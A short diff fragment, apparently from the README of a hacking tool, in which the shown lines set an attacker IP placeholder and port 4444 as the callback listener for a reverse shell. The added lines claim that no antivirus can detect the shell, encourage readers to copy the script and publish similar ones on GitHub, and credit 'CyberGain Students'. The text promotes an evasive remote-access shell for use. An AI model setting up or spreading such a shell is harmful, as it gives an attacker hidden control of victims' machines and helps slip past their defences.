@@ -7,3 +7,6 @@ Also, before you do the trick that we will use, change the IP that the script wi
 HOST = '<Attacker IP ADDRESS>' #Attacker_Machine_IP
 PORT = 4444 #Port Listner Attacker
 
+All antivriruses will not be able to recognize the shell that the tool is capable of. I was careful to do this step. you can understand the script and create similar to it and post it in ur Github account 
+The copyright only for CyberGain Students
+HF <3
